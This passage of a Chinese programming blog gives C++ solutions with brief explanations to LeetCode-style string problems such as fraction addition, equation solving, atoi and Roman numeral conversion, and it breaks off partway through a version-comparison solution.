- imag1 * imag2) + <span class="hljs-string">&quot;+&quot;</span> +<br>               <span class="hljs-built_in">to_string</span>(real1 * imag2 + real2 * imag1) + <span class="hljs-string">&quot;i&quot;</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="分数加减运算">分数加减运算</h2><blockquote><p>初始分数的分子为 <em>x</em>=0，分母为<em>y</em>=1。我们不断从字符串中获取下一个分数，它的分子为<em>x</em>1，分母为 <em>y</em>1，将它加到初始分数上。最后如果<em>x</em>=0，说明结果为零，直接返回"0/1"；否则计算分子分母的最大公约数，返回约简后分数的字符串表示。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">fractionAddition</span><span class="hljs-params">(string expression)</span> </span>&#123;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> x = <span class="hljs-number">0</span>, y = <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>, n = expression.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-keyword">while</span> (index &lt; n) &#123;<br>            <span class="hljs-type">long</span> <span class="hljs-type">long</span> x1 = <span class="hljs-number">0</span>, sign = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (expression[index] == <span class="hljs-string">&#x27;-&#x27;</span> || expression[index] == <span class="hljs-string">&#x27;+&#x27;</span>) &#123;<br>                sign = (expression[index] == <span class="hljs-string">&#x27;-&#x27;</span>) ? <span class="hljs-number">-1</span> : <span class="hljs-number">1</span>;<br>                index++;<br>            &#125;<br>            <span class="hljs-keyword">while</span> (index &lt; n &amp;&amp; <span class="hljs-built_in">isdigit</span>(expression[index])) &#123;<br>                x1 = x1 * <span class="hljs-number">10</span> + expression[index] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>                index++;<br>            &#125;<br>            x1 = x1 * sign;<br>            index++;<br><br>            <span class="hljs-type">long</span> <span class="hljs-type">long</span> y1 = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">while</span> (index &lt; n &amp;&amp; <span class="hljs-built_in">isdigit</span>(expression[index])) &#123;<br>                y1 = y1 * <span class="hljs-number">10</span> + expression[index] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>                index++;<br>            &#125;<br><br>            x = x * y1 + x1 * y;<br>            y *= y1;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (x == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0/1&quot;</span>;<br>        &#125;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> g = <span class="hljs-built_in">gcd</span>(<span class="hljs-built_in">abs</span>(x), y);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">to_string</span>(x / g) + <span class="hljs-string">&quot;/&quot;</span> + <span class="hljs-built_in">to_string</span>(y / g);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="求解方程">求解方程</h2><blockquote><p>将等式右边的项都移到等式左边，那么等式右边的项的默认系数为−1。依次解析方程的项，并将同类项进行合并，使用 factor表示变量的系数，val 表示常量值。初始时默认系数sign1=1，当解析到等号时，说明解析到等式右边的项，令 sign1=−1。使用变量sign2表示项的符号，初始时 sign2=sign1，如果我们解析到 ‘+’或‘-’，那么相应的更改 sign2 。使用 number 记录数字，valid 表示 number是否有效（变量 x前面可能没有数字），如果我们解析到的项是变量项，那么相应的更改factor；如果我们解析到的项是常量项，那么相应的更改 val。如果 factor=0成立，说明变量 x 对方程无影响，然后判断 val=0是否成立，成立则说明方程有无数解，返回 “Infinite solutions"，否则返回“No solution"。其他情况直接返回对应的整数解。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">solveEquation</span><span class="hljs-params">(string equation)</span> </span>&#123;<br>        <span class="hljs-type">int</span> factor = <span class="hljs-number">0</span>, val = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>, n = equation.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-type">int</span> sign1 = <span class="hljs-number">1</span>;  <span class="hljs-comment">// Sign before &#x27;=&#x27;</span><br><br>        <span class="hljs-keyword">while</span> (index &lt; n) &#123;<br>            <span class="hljs-keyword">if</span> (equation[index] == <span class="hljs-string">&#x27;=&#x27;</span>) &#123;<br>                sign1 = <span class="hljs-number">-1</span>;<br>                index++;<br>            &#125;<br><br>            <span class="hljs-type">int</span> sign2 = sign1, number = <span class="hljs-number">0</span>;<br>            <span class="hljs-type">bool</span> valid = <span class="hljs-literal">false</span>;<br><br>            <span class="hljs-keyword">if</span> (equation[index] == <span class="hljs-string">&#x27;-&#x27;</span> || equation[index] == <span class="hljs-string">&#x27;+&#x27;</span>) &#123;<br>                sign2 = (equation[index] == <span class="hljs-string">&#x27;-&#x27;</span>) ? -sign1 : sign1;<br>                index++;<br>            &#125;<br><br>            <span class="hljs-keyword">while</span> (index &lt; n &amp;&amp; <span class="hljs-built_in">isdigit</span>(equation[index])) &#123;<br>                number = number * <span class="hljs-number">10</span> + equation[index] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>                index++;<br>                valid = <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (index &lt; n &amp;&amp; equation[index] == <span class="hljs-string">&#x27;x&#x27;</span>) &#123;<br>                factor += valid ? sign2 * number : sign2;<br>                index++;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                val += sign2 * number;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (factor == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> val == <span class="hljs-number">0</span> ? <span class="hljs-string">&quot;Infinite solutions&quot;</span> : <span class="hljs-string">&quot;No solution&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;x=&quot;</span> + <span class="hljs-built_in">to_string</span>(-val / factor);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="外观数列">外观数列</h2><blockquote><p>所谓的「外观数列」，其实本质上只是依次统计字符串中连续相同字符的个数。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">countAndSay</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        string prev = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i++) &#123;<br>            string curr = <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-type">int</span> start = <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> pos = <span class="hljs-number">0</span>;<br><br>            <span class="hljs-keyword">while</span> (pos &lt; prev.<span class="hljs-built_in">length</span>()) &#123;<br>                <span class="hljs-keyword">while</span> (pos &lt; prev.<span class="hljs-built_in">length</span>() &amp;&amp; prev[pos] == prev[start]) &#123;<br>                    pos++;<br>                &#125;<br>                curr += <span class="hljs-built_in">to_string</span>(pos - start) + prev[start];<br>                start = pos;<br>            &#125;<br>            prev = curr;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> prev;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="压缩字符串">压缩字符串</h2><blockquote><p>双指针技巧来压缩字符串。使用两个指针 <code>start</code> 和<code>pos</code>，它们分别指向当前连续字符序列的起始位置和结束位置。通过移动<code>pos</code>指针来找到连续字符序列的结束位置，然后计算该字符序列的长度。如果长度大于1，则将字符及其数量编码为压缩形式，并将压缩后的字符序列放入原始字符数组中。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">compress</span><span class="hljs-params">(vector&lt;<span class="hljs-type">char</span>&gt;&amp; chars)</span> </span>&#123;<br>        <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> n = chars.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> start = <span class="hljs-number">0</span>, pos = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span> (pos &lt; n) &#123;<br>            <span class="hljs-keyword">while</span> (pos &lt; n &amp;&amp; chars[pos] == chars[start]) &#123;<br>                pos++;<br>            &#125;<br><br>            <span class="hljs-type">int</span> count = pos - start;<br>            chars[index++] = chars[start];<br>            <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">1</span>) &#123;<br>                string temp = <span class="hljs-built_in">to_string</span>(count);<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : temp) &#123;<br>                    chars[index++] = c;<br>                &#125;<br>            &#125;<br><br>            start = pos;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> index;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="字符串转换整数-atoi">字符串转换整数 (atoi)</h2><blockquote><ol type="1"><li>跳过前导空格；</li><li>处理符号；</li><li>处理数字部分，遍历字符串，将字符转换为数字并更新结果。在更新结果前，检查是否会溢出。最后，返回结果乘以符号。</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">myAtoi</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (s.<span class="hljs-built_in">empty</span>()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>, n = s.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-type">int</span> sign = <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">while</span> (index &lt; n &amp;&amp; s[index] == <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>            index++;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (index &lt; n &amp;&amp; (s[index] == <span class="hljs-string">&#x27;-&#x27;</span> || s[index] == <span class="hljs-string">&#x27;+&#x27;</span>)) &#123;<br>            sign = (s[index++] == <span class="hljs-string">&#x27;-&#x27;</span>) ? <span class="hljs-number">-1</span> : <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">while</span> (index &lt; n &amp;&amp; <span class="hljs-built_in">isdigit</span>(s[index])) &#123;<br>            <span class="hljs-type">int</span> digit = s[index] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>            <span class="hljs-keyword">if</span> (ans &gt; (INT_MAX - digit) / <span class="hljs-number">10</span>) &#123;<br>                <span class="hljs-keyword">return</span> (sign == <span class="hljs-number">1</span>) ? INT_MAX : INT_MIN;<br>            &#125;<br>            ans = ans * <span class="hljs-number">10</span> + digit;<br>            index++;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sign * ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="罗马数字转整数">罗马数字转整数</h2><blockquote><p>通常情况下，罗马数字中小的数字在大的数字的右边。若输入的字符串满足该情况，那么可以将每个字符视作一个单独的值，累加每个字符对应的数值即可。若存在小的数字在大的数字的左边的情况，根据规则需要减去小的数字。对于这种情况，我们也可以将每个字符视作一个单独的值，若一个数字右侧的数字比它大，则将该数字的符号取反。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    unordered_map&lt;<span class="hljs-type">char</span>, <span class="hljs-type">int</span>&gt; symbolValues = &#123;<br>        &#123;<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-number">1</span>&#125;,   &#123;<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-number">5</span>&#125;,   &#123;<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-number">10</span>&#125;,   &#123;<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-number">50</span>&#125;,<br>        &#123;<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-number">100</span>&#125;, &#123;<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-number">500</span>&#125;, &#123;<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-number">1000</span>&#125;,<br>    &#125;;<br><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">romanToInt</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> n = s.<span class="hljs-built_in">length</span>();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-type">int</span> value = symbolValues[s[i]];<br>            <span class="hljs-keyword">if</span> (i &lt; n - <span class="hljs-number">1</span> &amp;&amp; value &lt; symbolValues[s[i + <span class="hljs-number">1</span>]]) &#123;<br>                ans -= value;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ans += value;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="整数转罗马数字">整数转罗马数字</h2><blockquote><p>罗马数字由 7个不同的单字母符号组成，每个符号对应一个具体的数值。此外，减法规则（如问题描述中所述）给出了额外的6 个复合符号。这给了我们总共 13 个独特的符号（每个符号由 1 个或 2个字母组成）。根据罗马数字的唯一表示法，为了表示一个给定的整数num，我们寻找不超过 num 的最大符号值，将 num减去该符号值，然后继续寻找不超过 num的最大符号值，将该符号拼接在上一个找到的符号之后，循环直至 num 为0。最后得到的字符串即为 num 的罗马数字表示。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    vector&lt;pair&lt;<span class="hljs-type">int</span>, string&gt;&gt; valueSymbols = &#123;<br>        &#123;<span class="hljs-number">1000</span>, <span class="hljs-string">&quot;M&quot;</span>&#125;, &#123;<span class="hljs-number">900</span>, <span class="hljs-string">&quot;CM&quot;</span>&#125;, &#123;<span class="hljs-number">500</span>, <span class="hljs-string">&quot;D&quot;</span>&#125;, &#123;<span class="hljs-number">400</span>, <span class="hljs-string">&quot;CD&quot;</span>&#125;, &#123;<span class="hljs-number">100</span>, <span class="hljs-string">&quot;C&quot;</span>&#125;,<br>        &#123;<span class="hljs-number">90</span>, <span class="hljs-string">&quot;XC&quot;</span>&#125;,  &#123;<span class="hljs-number">50</span>, <span class="hljs-string">&quot;L&quot;</span>&#125;,   &#123;<span class="hljs-number">40</span>, <span class="hljs-string">&quot;XL&quot;</span>&#125;, &#123;<span class="hljs-number">10</span>, <span class="hljs-string">&quot;X&quot;</span>&#125;,   &#123;<span class="hljs-number">9</span>, <span class="hljs-string">&quot;IX&quot;</span>&#125;,<br>        &#123;<span class="hljs-number">5</span>, <span class="hljs-string">&quot;V&quot;</span>&#125;,    &#123;<span class="hljs-number">4</span>, <span class="hljs-string">&quot;IV&quot;</span>&#125;,   &#123;<span class="hljs-number">1</span>, <span class="hljs-string">&quot;I&quot;</span>&#125;,<br>    &#125;;<br><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">intToRoman</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        string ans = <span class="hljs-string">&quot;&quot;</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> [value, symbol] : valueSymbols) &#123;<br>            <span class="hljs-keyword">while</span> (num &gt;= value) &#123;<br>                num -= value;<br>                ans += symbol;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (num == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="整数转换英文表示">整数转换英文表示</h2><blockquote><p>由于非负整数 num 的最大值为 2<sup>31</sup>−1，因此最多有 10位数。将整数转换成英文表示中，将数字按照 3位一组划分，将每一组的英文表示拼接之后即可得到整数 num的英文表示。每一组最多有 3位数，可以使用递归的方式得到每一组的英文表示。根据数字所在的范围，具体做法如下：</p><ul><li>小于 20 的数可以直接得到其英文表示；</li><li>大于等于 20 且小于 100的数首先将十位转换成英文表示，然后对个位递归地转换成英文表示；</li><li>大于等于 100的数首先将百位转换成英文表示，然后对其余部分（十位和个位）递归地转换成英文表示。</li></ul><p>得到每一组的英文表示后，需要对每一组加上对应的表示单位的词，然后拼接得到整数<em>num</em> 的英文表示。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;string&gt; singles = &#123;<span class="hljs-string">&quot;&quot;</span>,     <span class="hljs-string">&quot;One&quot;</span>, <span class="hljs-string">&quot;Two&quot;</span>,   <span class="hljs-string">&quot;Three&quot;</span>, <span class="hljs-string">&quot;Four&quot;</span>,<br>                              <span class="hljs-string">&quot;Five&quot;</span>, <span class="hljs-string">&quot;Six&quot;</span>, <span class="hljs-string">&quot;Seven&quot;</span>, <span class="hljs-string">&quot;Eight&quot;</span>, <span class="hljs-string">&quot;Nine&quot;</span>&#125;;<br>    vector&lt;string&gt; teens = &#123;<span class="hljs-string">&quot;Ten&quot;</span>,      <span class="hljs-string">&quot;Eleven&quot;</span>,  <span class="hljs-string">&quot;Twelve&quot;</span>,  <span class="hljs-string">&quot;Thirteen&quot;</span>,<br>                            <span class="hljs-string">&quot;Fourteen&quot;</span>, <span class="hljs-string">&quot;Fifteen&quot;</span>, <span class="hljs-string">&quot;Sixteen&quot;</span>, <span class="hljs-string">&quot;Seventeen&quot;</span>,<br>                            <span class="hljs-string">&quot;Eighteen&quot;</span>, <span class="hljs-string">&quot;Nineteen&quot;</span>&#125;;<br>    vector&lt;string&gt; tens = &#123;<span class="hljs-string">&quot;&quot;</span>,      <span class="hljs-string">&quot;Ten&quot;</span>,   <span class="hljs-string">&quot;Twenty&quot;</span>,  <span class="hljs-string">&quot;Thirty&quot;</span>, <span class="hljs-string">&quot;Forty&quot;</span>,<br>                           <span class="hljs-string">&quot;Fifty&quot;</span>, <span class="hljs-string">&quot;Sixty&quot;</span>, <span class="hljs-string">&quot;Seventy&quot;</span>, <span class="hljs-string">&quot;Eighty&quot;</span>, <span class="hljs-string">&quot;Ninety&quot;</span>&#125;;<br>    vector&lt;string&gt; thousands = &#123;<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;Thousand&quot;</span>, <span class="hljs-string">&quot;Million&quot;</span>, <span class="hljs-string">&quot;Billion&quot;</span>&#125;;<br><br>    <span class="hljs-function">string <span class="hljs-title">numberToWords</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (num == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Zero&quot;</span>;<br>        &#125;<br>        string res;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">3</span>, unit = <span class="hljs-number">1000000000</span>; i &gt;= <span class="hljs-number">0</span>; i--, unit /= <span class="hljs-number">1000</span>) &#123;<br>            <span class="hljs-type">int</span> currNum = num / unit;<br>            <span class="hljs-keyword">if</span> (currNum != <span class="hljs-number">0</span>) &#123;<br>                num -= currNum * unit;<br>                string curr;<br>                <span class="hljs-built_in">recursion</span>(curr, currNum);<br>                curr = curr + thousands[i] + <span class="hljs-string">&quot; &quot;</span>;<br>                res += curr;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">while</span> (res.<span class="hljs-built_in">back</span>() == <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>            res.<span class="hljs-built_in">pop_back</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">recursion</span><span class="hljs-params">(string&amp; curr, <span class="hljs-type">int</span> num)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (num == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (num &lt; <span class="hljs-number">10</span>) &#123;<br>            curr = curr + singles[num] + <span class="hljs-string">&quot; &quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (num &lt; <span class="hljs-number">20</span>) &#123;<br>            curr = curr + teens[num - <span class="hljs-number">10</span>] + <span class="hljs-string">&quot; &quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (num &lt; <span class="hljs-number">100</span>) &#123;<br>            curr = curr + tens[num / <span class="hljs-number">10</span>] + <span class="hljs-string">&quot; &quot;</span>;<br>            <span class="hljs-built_in">recursion</span>(curr, num % <span class="hljs-number">10</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            curr = curr + singles[num / <span class="hljs-number">100</span>] + <span class="hljs-string">&quot; Hundred &quot;</span>;<br>            <span class="hljs-built_in">recursion</span>(curr, num % <span class="hljs-number">100</span>);<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="比较版本号">比较版本号</h2><blockquote><p>将版本号按照点号分割成修订号，然后从左到右比较两个版本号的相同下标的修订号。在比较修订号时，需要将字符串转换成整数进行比较。注意根据题目要求，如果版本号不存在某个下标处的修订号，则该修订号视为0。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">compareVersion</span><span class="hljs-params">(string version1, string version2)</span> </span>&#123;<br>        <span class="hljs-type">int</span> m = version1.<span class="hljs-built_in">length</span>(), n = version2.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (i &lt; m || j &lt; n) &#123;<br>            <span class="hljs-type">long</span> <span class="hljs-type">long</span> x = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> (; i &lt; m &amp;&amp; version1[i] != <span 